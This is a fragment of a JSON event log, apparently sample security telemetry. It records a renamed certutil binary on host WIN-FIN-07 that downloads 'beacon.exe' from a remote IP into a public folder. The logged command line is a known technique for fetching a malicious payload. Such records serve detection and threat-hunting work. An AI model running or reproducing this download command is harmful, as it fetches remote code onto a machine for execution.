          "Computer": "WIN-FIN-07",
          "User": "CORP\\j.doe",
          "Image": "C:\\Users\\Public\\cu.exe",
          "CommandLine": "certutil.exe -urlcache -f http://198.51.100.7/beacon.exe C:\\Users\\Public\\b.exe",
